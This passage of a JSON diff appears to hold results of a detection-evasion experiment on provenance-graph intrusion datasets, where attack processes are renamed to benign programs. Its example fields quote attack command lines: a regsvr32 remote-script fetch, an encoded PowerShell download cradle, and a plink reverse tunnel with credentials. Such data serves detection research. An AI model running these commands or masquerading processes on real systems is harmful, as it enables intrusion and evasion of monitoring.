@@ -1,0 +1,1276 @@
+{
+ "CADETS_E3": {
+  "targets": [
+   {
+    "key": "XIM",
+    "kind": "process",
+    "gt_nodes": 2,
+    "replacement_key": "sleep",
+    "replacement": "sleep",
+    "fallback_to_process": false,
+    "baseline_runs": 41232,
+    "renamed_nodes": 2
+   },
+   {
+    "key": "main",
+    "kind": "process",
+    "gt_nodes": 1,
+    "replacement_key": "sleep",
+    "replacement": "sleep",
+    "fallback_to_process": false,
+    "baseline_runs": 41232,
+    "renamed_nodes": 1
+   },
+   {
+    "key": "minions",
+    "kind": "process",
+    "gt_nodes": 2,
+    "replacement_key": "sleep",
+    "replacement": "sleep",
+    "fallback_to_process": false,
+    "baseline_runs": 41232,
+    "renamed_nodes": 2
+   },
+   {
+    "key": "pEja72mA",
+    "kind": "process",
+    "gt_nodes": 1,
+    "replacement_key": "sleep",
+    "replacement": "sleep",
+    "fallback_to_process": false,
+    "baseline_runs": 41232,
+    "renamed_nodes": 1
+   },
+   {
+    "key": "test",
+    "kind": "process",
+    "gt_nodes": 4,
+    "replacement_key": "sleep",
+    "replacement": "sleep",
+    "fallback_to_process": false,
+    "baseline_runs": 41232,
+    "renamed_nodes": 4
+   },
+   {
+    "key": "tmux-1002",
+    "kind": "process",
+    "gt_nodes": 2,
+    "replacement_key": "sleep",
+    "replacement": "sleep",
+    "fallback_to_process": false,
+    "baseline_runs": 41232,
+    "renamed_nodes": 2
+   },
+   {
+    "key": "vUgefal",
+    "kind": "process",
+    "gt_nodes": 1,
+    "replacement_key": "sleep",
+    "replacement": "sleep",
+    "fallback_to_process": false,
+    "baseline_runs": 41232,
+    "renamed_nodes": 1
+   }
+  ],
+  "renamed_nodes": 13,
+  "renamed_gt": 13,
+  "still_unknown": 0,
+  "baseline_programs": 112,
+  "baseline_processes": 137761,
+  "top_shell": "sh",
+  "top_process": "sleep",
+  "examples": [
+   {
+    "before": "subject None vUgefal",
+    "after": "subject None sleep",
+    "gt": true
+   },
+   {
+    "before": "subject None tmux-1002",
+    "after": "subject None sleep",
+    "gt": true
+   },
+   {
+    "before": "subject None tmux-1002",
+    "after": "subject None sleep",
+    "gt": true
+   }
+  ],
+  "set": "CADETS_E3",
+  "N": 469579,
+  "registry": 643486,
+  "test_nodes": 281585
+ },
+ "ATLASV2_EDR-h1": {
+  "targets": [
+   {
+    "key": "/windows/system32/mshta.exe",
+    "kind": "shell",
+    "gt_nodes": 6,
+    "replacement_key": "/python27/python.exe",
+    "replacement": "c:\\python27\\python.exe",
+    "fallback_to_process": false,
+    "baseline_runs": 14,
+    "renamed_nodes": 6
+   },
+   {
+    "key": "/windows/system32/regsvr32.exe",
+    "kind": "process",
+    "gt_nodes": 5,
+    "replacement_key": "/program files/confer/repwmiutils.exe",
+    "replacement": "c:\\program files\\confer\\repwmiutils.exe",
+    "fallback_to_process": false,
+    "baseline_runs": 24913,
+    "renamed_nodes": 5
+   },
+   {
+    "key": "/windows/system32/windowspowershell/{v}/powershell.exe",
+    "kind": "shell",
+    "gt_nodes": 8,
+    "replacement_key": "/python27/python.exe",
+    "replacement": "c:\\python27\\python.exe",
+    "fallback_to_process": false,
+    "baseline_runs": 14,
+    "renamed_nodes": 8
+   }
+  ],
+  "renamed_nodes": 19,
+  "renamed_gt": 19,
+  "still_unknown": 0,
+  "baseline_programs": 92,
+  "baseline_processes": 26643,
+  "top_shell": "/python27/python.exe",
+  "top_process": "/program files/confer/repwmiutils.exe",
+  "examples": [
+   {
+    "before": "subject c:\\windows\\system32\\regsvr32.exe None",
+    "after": "subject c:\\program files\\confer\\repwmiutils.exe None",
+    "gt": true
+   },
+   {
+    "before": "subject c:\\windows\\system32\\regsvr32.exe regsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll",
+    "after": "subject c:\\program files\\confer\\repwmiutils.exe repwmiutils /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll",
+    "gt": true
+   },
+   {
+    "before": "subject c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe None",
+    "after": "subject c:\\python27\\python.exe None",
+    "gt": true
+   }
+  ],
+  "set": "ATLASV2_EDR-h1",
+  "N": 421919,
+  "registry": 528178,
+  "test_nodes": 108746
+ },
+ "ATLASV2_EDR-h2": {
+  "targets": [],
+  "renamed_nodes": 0,
+  "renamed_gt": 0,
+  "still_unknown": 0,
+  "baseline_programs": 94,
+  "baseline_processes": 27396,
+  "top_shell": "/users/aalsahee/appdata/local/programs/python/python38-32/python.exe",
+  "top_process": "/program files/confer/repwmiutils.exe",
+  "examples": [],
+  "set": "ATLASV2_EDR-h2",
+  "N": 98252,
+  "registry": 135547,
+  "test_nodes": 40127
+ },
+ "CLEARSCOPE_E3": {
+  "targets": [],
+  "renamed_nodes": 0,
+  "renamed_gt": 0,
+  "still_unknown": 0,
+  "baseline_programs": 33,
+  "baseline_processes": 827,
+  "top_shell": null,
+  "top_process": "com.android.quicksearchbox",
+  "examples": [],
+  "set": "CLEARSCOPE_E3",
+  "N": 132161,
+  "registry": 236946,
+  "test_nodes": 111403
+ },
+ "THEIA_E3": {
+  "targets": [
+   {
+    "key": "/etc/firefox/native-messaging-hosts/gtcache",
+    "kind": "process",
+    "gt_nodes": 34,
+    "replacement_key": "/home/admin/Downloads/firefox/firefox",
+    "replacement": "/home/admin/Downloads/firefox/firefox",
+    "fallback_to_process": false,
+    "baseline_runs": 51806,
+    "renamed_nodes": 34
+   },
+   {
+    "key": "/etc/firefox/native-messaging-hosts/pass_mgr",
+    "kind": "process",
+    "gt_nodes": 1,
+    "replacement_key": "/home/admin/Downloads/firefox/firefox",
+    "replacement": "/home/admin/Downloads/firefox/firefox",
+    "fallback_to_process": false,
+    "baseline_runs": 51806,
+    "renamed_nodes": 1
+   },
+   {
+    "key": "/home/admin/clean",
+    "kind": "process",
+    "gt_nodes": 19,
+    "replacement_key": "/home/admin/Downloads/firefox/firefox",
+    "replacement": "/home/admin/Downloads/firefox/firefox",
+    "fallback_to_process": false,
+    "baseline_runs": 51806,
+    "renamed_nodes": 19
+   },
+   {
+    "key": "/home/admin/profile",
+    "kind": "process",
+    "gt_nodes": 6,
+    "replacement_key": "/home/admin/Downloads/firefox/firefox",
+    "replacement": "/home/admin/Downloads/firefox/firefox",
+    "fallback_to_process": false,
+    "baseline_runs": 51806,
+    "renamed_nodes": 28
+   },
+   {
+    "key": "/var/log/mail",
+    "kind": "process",
+    "gt_nodes": 3,
+    "replacement_key": "/home/admin/Downloads/firefox/firefox",
+    "replacement": "/home/admin/Downloads/firefox/firefox",
+    "fallback_to_process": false,
+    "baseline_runs": 51806,
+    "renamed_nodes": 3
+   }
+  ],
+  "renamed_nodes": 85,
+  "renamed_gt": 63,
+  "still_unknown": 0,
+  "baseline_programs": 130,
+  "baseline_processes": 107137,
+  "top_shell": "/bin/dash",
+  "top_process": "/home/admin/Downloads/firefox/firefox",
+  "examples": [
+   {
+    "before": "subject /home/admin/clean /home/admin/clean",
+    "after": "subject /home/admin/Downloads/firefox/firefox /home/admin/Downloads/firefox/firefox",
+    "gt": true
+   },
+   {
+    "before": "subject /home/admin/clean /home/admin/clean",
+    "after": "subject /home/admin/Downloads/firefox/firefox /home/admin/Downloads/firefox/firefox",
+    "gt": true
+   },
+   {
+    "before": "subject /home/admin/clean (deleted) /home/admin/clean",
+    "after": "subject /home/admin/Downloads/firefox/firefox (deleted) /home/admin/Downloads/firefox/firefox",
+    "gt": true
+   }
+  ],
+  "set": "THEIA_E3",
+  "N": 446804,
+  "registry": 1065689,
+  "test_nodes": 700902
+ },
+ "FIVEDIRECTIONS_E3": {
+  "targets": [
+   {
+    "key": "/\"cmd.exe/\"",
+    "kind": "process",
+    "gt_nodes": 1,
+    "replacement_key": "/\"c://program",
+    "replacement": "\\\"C:\\\\Program",
+    "fallback_to_process": false,
+    "baseline_runs": 2149,
+    "renamed_nodes": 2
+   },
+   {
+    "key": "//windows//system32//net1",
+    "kind": "process",
+    "gt_nodes": 2,
+    "replacement_key": "/\"c://program",
+    "replacement": "\\\"C:\\\\Program",
+    "fallback_to_process": false,
+    "baseline_runs": 2149,
+    "renamed_nodes": 11
+   },
+   {
+    "key": "net",
+    "kind": "process",
+    "gt_nodes": 2,
+    "replacement_key": "/\"c://program",
+    "replacement": "\\\"C:\\\\Program",
+    "fallback_to_process": false,
+    "baseline_runs": 2149,
+    "renamed_nodes": 11
+   },
+   {
+    "key": "powershell",
+    "kind": "shell",
+    "gt_nodes": 1,
+    "replacement_key": "/\"c://program",
+    "replacement": "\\\"C:\\\\Program",
+    "fallback_to_process": true,
+    "baseline_runs": 2149,
+    "renamed_nodes": 3
+   },
+   {
+    "key": "taskkill",
+    "kind": "process",
+    "gt_nodes": 2,
+    "replacement_key": "/\"c://program",
+    "replacement": "\\\"C:\\\\Program",
+    "fallback_to_process": false,
+    "baseline_runs": 2149,
+    "renamed_nodes": 2
+   }
+  ],
+  "renamed_nodes": 29,
+  "renamed_gt": 8,
+  "still_unknown": 0,
+  "baseline_programs": 105,
+  "baseline_processes": 6877,
+  "top_shell": null,
+  "top_process": "/\"c://program",
+  "examples": [
+   {
+    "before": "subject None powershell",
+    "after": "subject None \\\"C:\\\\Program",
+    "gt": false
+   },
+   {
+    "before": "subject None powershell  -nop -ep bypass -encodedCommand KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAGYAaQBsAGU",
+    "after": "subject None \\\"C:\\\\Program  -nop -ep bypass -encodedCommand KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAGYAaQBs",
+    "gt": true
+   },
+   {
+    "before": "subject None \\\"cmd.exe\\\"",
+    "after": "subject None \\\"C:\\\\Program",
+    "gt": false
+   }
+  ],
+  "set": "FIVEDIRECTIONS_E3",
+  "N": 169935,
+  "registry": 389447,
+  "test_nodes": 282820
+ },
+ "OPTC_H051": {
+  "targets": [
+   {
+    "key": "/users/dcoombes/downloads/update.exe",
+    "kind": "process",
+    "gt_nodes": 2,
+    "replacement_key": "/windows/system32/cmd.exe",
+    "replacement": "/Device/HarddiskVolume1/Windows/SYSTEM32/cmd.exe",
+    "fallback_to_process": false,
+    "baseline_runs": 7256,
+    "renamed_nodes": 2
+   },
+   {
+    "key": "/windows/temp/rad076f2.tmp/biguwcmnsucig.exe",
+    "kind": "process",
+    "gt_nodes": 1,
+    "replacement_key": "/windows/system32/cmd.exe",
+    "replacement": "/Device/HarddiskVolume1/Windows/SYSTEM32/cmd.exe",
+    "fallback_to_process": false,
+    "baseline_runs": 7256,
+    "renamed_nodes": 14
+   },
+   {
+    "key": "/windows/temp/rad0f93b.tmp/biguwcmnsucig.exe",
+    "kind": "process",
+    "gt_nodes": 1,
+    "replacement_key": "/windows/system32/cmd.exe",
+    "replacement": "/Device/HarddiskVolume1/Windows/SYSTEM32/cmd.exe",
+    "fallback_to_process": false,
+    "baseline_runs": 7256,
+    "renamed_nodes": 1
+   },
+   {
+    "key": "/windows/temp/rad1ba52.tmp/biguwcmnsucig.exe",
+    "kind": "process",
+    "gt_nodes": 1,
+    "replacement_key": "/windows/system32/cmd.exe",
+    "replacement": "/Device/HarddiskVolume1/Windows/SYSTEM32/cmd.exe",
+    "fallback_to_process": false,
+    "baseline_runs": 7256,
+    "renamed_nodes": 1
+   },
+   {
+    "key": "/windows/temp/rad1c3a2.tmp/biguwcmnsucig.exe",
+    "kind": "process",
+    "gt_nodes": 1,
+    "replacement_key": "/windows/system32/cmd.exe",
+    "replacement": "/Device/HarddiskVolume1/Windows/SYSTEM32/cmd.exe",
+    "fallback_to_process": false,
+    "baseline_runs": 7256,
+    "renamed_nodes": 2
+   },
+   {
+    "key": "/windows/temp/rad1cc6c.tmp/biguwcmnsucig.exe",
+    "kind": "process",
+    "gt_nodes": 1,
+    "replacement_key": "/windows/system32/cmd.exe",
+    "replacement": "/Device/HarddiskVolume1/Windows/SYSTEM32/cmd.exe",
+    "fallback_to_process": false,
+    "baseline_runs": 7256,
+    "renamed_nodes": 1
+   },
+   {
+    "key": "/windows/temp/rad20015.tmp/biguwcmnsucig.exe",
+    "kind": "process",
+    "gt_nodes": 1,
+    "replacement_key": "/windows/system32/cmd.exe",
+    "replacement": "/Device/HarddiskVolume1/Windows/SYSTEM32/cmd.exe",
+    "fallback_to_process": false,
+    "baseline_runs": 7256,
+    "renamed_nodes": 1
+   },
+   {
+    "key": "/windows/temp/rad231b5.tmp/biguwcmnsucig.exe",
+    "kind": "process",
+    "gt_nodes": 1,
+    "replacement_key": "/windows/system32/cmd.exe",
+    "replacement": "/Device/HarddiskVolume1/Windows/SYSTEM32/cmd.exe",
+    "fallback_to_process": false,
+    "baseline_runs": 7256,
+    "renamed_nodes": 1
+   },
+   {
+    "key": "/windows/temp/rad28dc8.tmp/biguwcmnsucig.exe",
+    "kind": "process",
+    "gt_nodes": 1,
+    "replacement_key": "/windows/system32/cmd.exe",
+    "replacement": "/Device/HarddiskVolume1/Windows/SYSTEM32/cmd.exe",
+    "fallback_to_process": false,
+    "baseline_runs": 7256,
+    "renamed_nodes": 1
+   },
+   {
+    "key": "/windows/temp/rad38e8a.tmp/biguwcmnsucig.exe",
+    "kind": "process",
+    "gt_nodes": 1,
+    "replacement_key": "/windows/system32/cmd.exe",
+    "replacement": "/Device/HarddiskVolume1/Windows/SYSTEM32/cmd.exe",
+    "fallback_to_process": false,
+    "baseline_runs": 7256,
+    "renamed_nodes": 2
+   },
+   {
+    "key": "/windows/temp/rad41041.tmp/biguwcmnsucig.exe",
+    "kind": "process",
+    "gt_nodes": 1,
+    "replacement_key": "/windows/system32/cmd.exe",
+    "replacement": "/Device/HarddiskVolume1/Windows/SYSTEM32/cmd.exe",
+    "fallback_to_process": false,
+    "baseline_runs": 7256,
+    "renamed_nodes": 1
+   },
+   {
+    "key": "/windows/temp/rad4f110.tmp/biguwcmnsucig.exe",
+    "kind": "process",
+    "gt_nodes": 1,
+    "replacement_key": "/windows/system32/cmd.exe",
+    "replacement": "/Device/HarddiskVolume1/Windows/SYSTEM32/cmd.exe",
+    "fallback_to_process": false,
+    "baseline_runs": 7256,
+    "renamed_nodes": 2
+   },
+   {
+    "key": "/windows/temp/rad5446e.tmp/biguwcmnsucig.exe",
+    "kind": "process",
+    "gt_nodes": 1,
+    "replacement_key": "/windows/system32/cmd.exe",
+    "replacement": "/Device/HarddiskVolume1/Windows/SYSTEM32/cmd.exe",
+    "fallback_to_process": false,
+    "baseline_runs": 7256,
+    "renamed_nodes": 1
+   },
+   {
+    "key": "/windows/temp/rad54e46.tmp/biguwcmnsucig.exe",
+    "kind": "process",
+    "gt_nodes": 1,
+    "replacement_key": "/windows/system32/cmd.exe",
+    "replacement": "/Device/HarddiskVolume1/Windows/SYSTEM32/cmd.exe",
+    "fallback_to_process": false,
+    "baseline_runs": 7256,
+    "renamed_nodes": 1
+   },
+   {
+    "key": "/windows/temp/rad640ca.tmp/biguwcmnsucig.exe",
+    "kind": "process",
+    "gt_nodes": 1,
+    "replacement_key": "/windows/system32/cmd.exe",
+    "replacement": "/Device/HarddiskVolume1/Windows/SYSTEM32/cmd.exe",
+    "fallback_to_process": false,
+    "baseline_runs": 7256,
+    "renamed_nodes": 2
+   },
+   {
+    "key": "/windows/temp/rad71b66.tmp/biguwcmnsucig.exe",
+    "kind": "process",
+    "gt_nodes": 1,
+    "replacement_key": "/windows/system32/cmd.exe",
+    "replacement": "/Device/HarddiskVolume1/Windows/SYSTEM32/cmd.exe",
+    "fallback_to_process": false,
+    "baseline_runs": 7256,
+    "renamed_nodes": 2
+   },
+   {
+    "key": "/windows/temp/rad77cfb.tmp/biguwcmnsucig.exe",
+    "kind": "process",
+    "gt_nodes": 1,
+    "replacement_key": "/windows/system32/cmd.exe",
+    "replacement": "/Device/HarddiskVolume1/Windows/SYSTEM32/cmd.exe",
+    "fallback_to_process": false,
+    "baseline_runs": 7256,
+    "renamed_nodes": 1
+   },
+   {
+    "key": "/windows/temp/rad838e6.tmp/biguwcmnsucig.exe",
+    "kind": "process",
+    "gt_nodes": 1,
+    "replacement_key": "/windows/system32/cmd.exe",
+    "replacement": "/Device/HarddiskVolume1/Windows/SYSTEM32/cmd.exe",
+    "fallback_to_process": false,
+    "baseline_runs": 7256,
+    "renamed_nodes": 1
+   },
+   {
+    "key": "/windows/temp/rad95ebc.tmp/biguwcmnsucig.exe",
+    "kind": "process",
+    "gt_nodes": 1,
+    "replacement_key": "/windows/system32/cmd.exe",
+    "replacement": "/Device/HarddiskVolume1/Windows/SYSTEM32/cmd.exe",
+    "fallback_to_process": false,
+    "baseline_runs": 7256,
+    "renamed_nodes": 1
+   },
+   {
+    "key": "/windows/temp/rad99e71.tmp/biguwcmnsucig.exe",
+    "kind": "process",
+    "gt_nodes": 1,
+    "replacement_key": "/windows/system32/cmd.exe",
+    "replacement": "/Device/HarddiskVolume1/Windows/SYSTEM32/cmd.exe",
+    "fallback_to_process": false,
+    "baseline_runs": 7256,
+    "renamed_nodes": 1
+   },
+   {
+    "key": "/windows/temp/rad9dd75.tmp/biguwcmnsucig.exe",
+    "kind": "process",
+    "gt_nodes": 1,
+    "replacement_key": "/windows/system32/cmd.exe",
+    "replacement": "/Device/HarddiskVolume1/Windows/SYSTEM32/cmd.exe",
+    "fallback_to_process": false,
+    "baseline_runs": 7256,
+    "renamed_nodes": 1
+   },
+   {
+    "key": "/windows/temp/rad9fad6.tmp/biguwcmnsucig.exe",
+    "kind": "process",
+    "gt_nodes": 1,
+    "replacement_key": "/windows/system32/cmd.exe",
+    "replacement": "/Device/HarddiskVolume1/Windows/SYSTEM32/cmd.exe",
+    "fallback_to_process": false,
+    "baseline_runs": 7256,
+    "renamed_nodes": 2
+   },
+   {
+    "key": "/windows/temp/radaf010.tmp/biguwcmnsucig.exe",
+    "kind": "process",
+    "gt_nodes": 1,
+    "replacement_key": "/windows/system32/cmd.exe",
+    "replacement": "/Device/HarddiskVolume1/Windows/SYSTEM32/cmd.exe",
+    "fallback_to_process": false,
+    "baseline_runs": 7256,
+    "renamed_nodes": 2
+   },
+   {
+    "key": "/windows/temp/radb895d.tmp/biguwcmnsucig.exe",
+    "kind": "process",
+    "gt_nodes": 1,
+    "replacement_key": "/windows/system32/cmd.exe",
+    "replacement": "/Device/HarddiskVolume1/Windows/SYSTEM32/cmd.exe",
+    "fallback_to_process": false,
+    "baseline_runs": 7256,
+    "renamed_nodes": 1
+   },
+   {
+    "key": "/windows/temp/radc50e7.tmp/biguwcmnsucig.exe",
+    "kind": "process",
+    "gt_nodes": 1,
+    "replacement_key": "/windows/system32/cmd.exe",
+    "replacement": "/Device/HarddiskVolume1/Windows/SYSTEM32/cmd.exe",
+    "fallback_to_process": false,
+    "baseline_runs": 7256,
+    "renamed_nodes": 1
+   },
+   {
+    "key": "/windows/temp/radc5eb1.tmp/biguwcmnsucig.exe",
+    "kind": "process",
+    "gt_nodes": 1,
+    "replacement_key": "/windows/system32/cmd.exe",
+    "replacement": "/Device/HarddiskVolume1/Windows/SYSTEM32/cmd.exe",
+    "fallback_to_process": false,
+    "baseline_runs": 7256,
+    "renamed_nodes": 1
+   },
+   {
+    "key": "/windows/temp/radcbb57.tmp/biguwcmnsucig.exe",
+    "kind": "process",
+    "gt_nodes": 1,
+    "replacement_key": "/windows/system32/cmd.exe",
+    "replacement": "/Device/HarddiskVolume1/Windows/SYSTEM32/cmd.exe",
+    "fallback_to_process": false,
+    "baseline_runs": 7256,
+    "renamed_nodes": 1
+   },
+   {
+    "key": "/windows/temp/radd85fe.tmp/biguwcmnsucig.exe",
+    "kind": "process",
+    "gt_nodes": 1,
+    "replacement_key": "/windows/system32/cmd.exe",
+    "replacement": "/Device/HarddiskVolume1/Windows/SYSTEM32/cmd.exe",
+    "fallback_to_process": false,
+    "baseline_runs": 7256,
+    "renamed_nodes": 1
+   },
+   {
+    "key": "/windows/temp/rade1ba0.tmp/biguwcmnsucig.exe",
+    "kind": "process",
+    "gt_nodes": 1,
+    "replacement_key": "/windows/system32/cmd.exe",
+    "replacement": "/Device/HarddiskVolume1/Windows/SYSTEM32/cmd.exe",
+    "fallback_to_process": false,
+    "baseline_runs": 7256,
+    "renamed_nodes": 1
+   },
+   {
+    "key": "/windows/temp/radeb31a.tmp/biguwcmnsucig.exe",
+    "kind": "process",
+    "gt_nodes": 1,
+    "replacement_key": "/windows/system32/cmd.exe",
+    "replacement": "/Device/HarddiskVolume1/Windows/SYSTEM32/cmd.exe",
+    "fallback_to_process": false,
+    "baseline_runs": 7256,
+    "renamed_nodes": 1
+   }
+  ],
+  "renamed_nodes": 51,
+  "renamed_gt": 31,
+  "still_unknown": 0,
+  "baseline_programs": 123,
+  "baseline_processes": 29845,
+  "top_shell": "/python27/python.exe",
+  "top_process": "/windows/system32/cmd.exe",
+  "examples": [
+   {
+    "before": "subject biguwcmnsucig.exe None",
+    "after": "subject /Device/HarddiskVolume1/Windows/SYSTEM32/cmd.exe None",
+    "gt": false
+   },
+   {
+    "before": "subject /Device/HarddiskVolume1/Windows/Temp/rad0F93B.tmp/biGuWCmNsuCIG.exe \"C:/Windows/Temp/rad0F93B.tmp/biGuWCmNsuCIG.exe\" ",
+    "after": "subject /Device/HarddiskVolume1/Windows/SYSTEM32/cmd.exe \"/Device/HarddiskVolume1/Windows/SYSTEM32/cmd.exe\" ",
+    "gt": true
+   },
+   {
+    "before": "subject /Device/HarddiskVolume1/Windows/Temp/rad838E6.tmp/biGuWCmNsuCIG.exe \"C:/Windows/Temp/rad838E6.tmp/biGuWCmNsuCIG.exe\" ",
+    "after": "subject /Device/HarddiskVolume1/Windows/SYSTEM32/cmd.exe \"/Device/HarddiskVolume1/Windows/SYSTEM32/cmd.exe\" ",
+    "gt": true
+   }
+  ],
+  "set": "OPTC_H051",
+  "N": 2305681,
+  "registry": 3771684,
+  "test_nodes": 1470238
+ },
+ "OPTC_H201": {
+  "targets": [],
+  "renamed_nodes": 0,
+  "renamed_gt": 0,
+  "still_unknown": 0,
+  "baseline_programs": 128,
+  "baseline_processes": 42202,
+  "top_shell": "/python27/python.exe",
+  "top_process": "/windows/system32/cmd.exe",
+  "examples": [],
+  "set": "OPTC_H201",
+  "N": 2368199,
+  "registry": 3801464,
+  "test_nodes": 1437360
+ },
+ "OPTC_H501": {
+  "targets": [
+   {
+    "key": "/users/sysadmin/downloads/filetransfer1000.exe",
+    "kind": "process",
+    "gt_nodes": 6,
+    "replacement_key": "/windows/system32/cmd.exe",
+    "replacement": "/Device/HarddiskVolume1/Windows/system32/cmd.exe",
+    "fallback_to_process": false,
+    "baseline_runs": 11964,
+    "renamed_nodes": 6
+   },
+   {
+    "key": "/windows/system32/plink.exe",
+    "kind": "process",
+    "gt_nodes": 1,
+    "replacement_key": "/windows/system32/cmd.exe",
+    "replacement": "/Device/HarddiskVolume1/Windows/system32/cmd.exe",
+    "fallback_to_process": false,
+    "baseline_runs": 11964,
+    "renamed_nodes": 1
+   }
+  ],
+  "renamed_nodes": 7,
+  "renamed_gt": 7,
+  "still_unknown": 0,
+  "baseline_programs": 127,
+  "baseline_processes": 46131,
+  "top_shell": "/python27/python.exe",
+  "top_process": "/windows/system32/cmd.exe",
+  "examples": [
+   {
+    "before": "subject /Device/HarddiskVolume1/Windows/system32/plink.exe \"C:/Windows/system32/plink.exe\" sports.com -R 4000:127.0.0.1:3389 -l myguest -pw myguest",
+    "after": "subject /Device/HarddiskVolume1/Windows/system32/cmd.exe \"/Device/HarddiskVolume1/Windows/system32/cmd.exe\" sports.com -R 4000:127.0.0.1:3389 -l myguest -pw myg",
+    "gt": true
+   },
+   {
+    "before": "subject /Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe \"C:/Users/sysadmin/Downloads/fileTransfer1000.exe\"",
+    "after": "subject /Device/HarddiskVolume1/Windows/system32/cmd.exe \"/Device/HarddiskVolume1/Windows/system32/cmd.exe\"",
+    "gt": true
+   },
+   {
+    "before": "subject /Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe \"C:/Users/sysadmin/Downloads/fileTransfer1000.exe\" --help",
+    "after": "subject /Device/HarddiskVolume1/Windows/system32/cmd.exe \"/Device/HarddiskVolume1/Windows/system32/cmd.exe\" --help",
+    "gt": true
+   }
+  ],
+  "set": "OPTC_H501",
+  "N": 2361724,
+  "registry": 3846479,
+  "test_nodes": 1488735
+ },
+ "CARBANAKV2_EDR-h1": {
+  "targets": [
+   {
+    "key": "/users/efficientgoldfinch/appdata/roaming/transbaseodbcdriver/plink.exe",
+    "kind": "process",
+    "gt_nodes": 1,
+    "replacement_key": "/program files (x86)/microsoft/edge/application/msedge.exe",
+    "replacement": "c:\\program files (x86)\\microsoft\\edge\\application\\msedge.exe",
+    "fallback_to_process": false,
+    "baseline_runs": 1911,
+    "renamed_nodes": 1
+   },
+   {
+    "key": "/users/efficientgoldfinch/appdata/roaming/transbaseodbcdriver/pscp.exe",
+    "kind": "process",
+    "gt_nodes": 4,
+    "replacement_key": "/program files (x86)/microsoft/edge/application/msedge.exe",
+    "replacement": "c:\\program files (x86)\\microsoft\\edge\\application\\msedge.exe",
+    "fallback_to_process": false,
+    "baseline_runs": 1911,
+    "renamed_nodes": 4
+   },
+   {
+    "key": "/windows/microsoft.net/framework64/{v}/csc.exe",
+    "kind": "process",
+    "gt_nodes": 1,
+    "replacement_key": "/program files (x86)/microsoft/edge/application/msedge.exe",
+    "replacement": "c:\\program files (x86)\\microsoft\\edge\\application\\msedge.exe",
+    "fallback_to_process": false,
+    "baseline_runs": 1911,
+    "renamed_nodes": 1
+   },
+   {
+    "key": "/windows/system32/wscript.exe",
+    "kind": "shell",
+    "gt_nodes": 5,
+    "replacement_key": "/windows/system32/windowspowershell/{v}/powershell.exe",
+    "replacement": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
+    "fallback_to_process": false,
+    "baseline_runs": 25,
+    "renamed_nodes": 5
+   }
+  ],
+  "renamed_nodes": 11,
+  "renamed_gt": 11,
+  "still_unknown": 0,
+  "baseline_programs": 222,
+  "baseline_processes": 10228,
+  "top_shell": "/windows/system32/windowspowershell/{v}/powershell.exe",
+  "top_process": "/program files (x86)/microsoft/edge/application/msedge.exe",
+  "examples": [
+   {
+    "before": "subject c:\\windows\\system32\\wscript.exe None",
+    "after": "subject c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe None",
+    "gt": true
+   },
+   {
+    "before": "subject c:\\windows\\system32\\wscript.exe \"C:\\Windows\\System32\\WScript.exe\" \"C:\\Users\\efficientgoldfinch\\AppData\\Roaming\\TransbaseOdbcDriver\\starter.vbs\" ",
+    "after": "subject c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe \"c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe\" \"C:\\Users\\efficientgoldfinch\\AppDa",
+    "gt": true
+   },
+   {
+    "before": "subject c:\\windows\\system32\\wscript.exe None",
+    "after": "subject c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe None",
+    "gt": true
+   }
+  ],
+  "set": "CARBANAKV2_EDR-h1",
+  "N": 774784,
+  "registry": 1295989,
+  "test_nodes": 537581
+ },
+ "CARBANAKV2_EDR-h2": {
+  "targets": [
+   {
+    "key": "/users/public/vnc-settings.reg",
+    "kind": "process",
+    "gt_nodes": 1,
+    "replacement_key": "/program files (x86)/microsoft/edge/application/msedge.exe",
+    "replacement": "c:\\program files (x86)\\microsoft\\edge\\application\\msedge.exe",
+    "fallback_to_process": false,
+    "baseline_runs": 494,
+    "renamed_nodes": 1
+   },
+   {
+    "key": "/windows/system32/hostname.exe",
+    "kind": "process",
+    "gt_nodes": 1,
+    "replacement_key": "/program files (x86)/microsoft/edge/application/msedge.exe",
+    "replacement": "c:\\program files (x86)\\microsoft\\edge\\application\\msedge.exe",
+    "fallback_to_process": false,
+    "baseline_runs": 494,
+    "renamed_nodes": 1
+   },
+   {
+    "key": "/windows/system32/ipconfig.exe",
+    "kind": "process",
+    "gt_nodes": 1,
+    "replacement_key": "/program files (x86)/microsoft/edge/application/msedge.exe",
+    "replacement": "c:\\program files (x86)\\microsoft\\edge\\application\\msedge.exe",
+    "fallback_to_process": false,
+    "baseline_runs": 494,
+    "renamed_nodes": 1
+   },
+   {
+    "key": "/windows/system32/mstsc.exe",
+    "kind": "process",
+    "gt_nodes": 3,
+    "replacement_key": "/program files (x86)/microsoft/edge/application/msedge.exe",
+    "replacement": "c:\\program files (x86)\\microsoft\\edge\\application\\msedge.exe",
+    "fallback_to_process": false,
+    "baseline_runs": 494,
+    "renamed_nodes": 3
+   },
+   {
+    "key": "/windows/system32/netsh.exe",
+    "kind": "process",
+    "gt_nodes": 1,
+    "replacement_key": "/program files (x86)/microsoft/edge/application/msedge.exe",
+    "replacement": "c:\\program files (x86)\\microsoft\\edge\\application\\msedge.exe",
+    "fallback_to_process": false,
+    "baseline_runs": 494,
+    "renamed_nodes": 1
+   },
+   {
+    "key": "/windows/system32/rdpclip.exe",
+    "kind": "process",
+    "gt_nodes": 1,
+    "replacement_key": "/program files (x86)/microsoft/edge/application/msedge.exe",
+    "replacement": "c:\\program files (x86)\\microsoft\\edge\\application\\msedge.exe",
+    "fallback_to_process": false,
+    "baseline_runs": 494,
+    "renamed_nodes": 1
+   },
+   {
+    "key": "/windows/system32/reg.exe",
+    "kind": "process",
+    "gt_nodes": 2,
+    "replacement_key": "/program files (x86)/microsoft/edge/application/msedge.exe",
+    "replacement": "c:\\program files (x86)\\microsoft\\edge\\application\\msedge.exe",
